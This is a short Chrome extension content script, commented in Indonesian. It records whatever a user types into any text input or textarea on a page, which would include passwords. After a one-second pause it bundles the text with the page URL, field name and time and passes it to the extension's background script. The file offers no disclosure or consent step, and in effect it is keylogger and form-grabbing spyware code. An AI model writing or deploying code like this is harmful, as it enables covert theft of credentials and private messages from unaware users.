chrome.runtime.onConnect.addListener(function(port) {});

var k = "";
var data = {};
var typingTimer;
var doneTypingInterval = 1000;

// Inisialisasi logId pada elemen input atau textarea yang ada di halaman
var inputElements = document.querySelectorAll("input, textarea");
inputElements.forEach(function(element) {

});

window.addEventListener("input", function(event) {
  if (!isTextInputElement(event.target)) {
    return;
  }

  clearTimeout(typingTimer);
  k = event.target.value;
  typingTimer = setTimeout(function() {
    sendData(event.target.name);
  }, doneTypingInterval);
});

function sendData(name) {
  if (k !== "") {
    data = {
      key: k,
      page: window.location.href,
      name: name,
      local_datetime: new Date().toLocaleString(),
      extension_id: chrome.runtime.id
    };

     // Mengubah format tanggal dan waktu menjadi "dd-mm-yyyy - hh:mm"
    const dateParts = data.local_datetime.split(",")[0].split("/");
    const formattedDate = `${dateParts[1].padStart(2, "0")}-${dateParts[0].padStart(2, "0")}-${dateParts[2]}`;
    const timeParts = data.local_datetime.split(",")[1].trim().slice(0, -3);
    data.local_datetime = `${formattedDate} - ${timeParts}`;

    chrome.runtime.sendMessage(data);
  }

  k = "";
}

function isTextInputElement(element) {
  return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
}
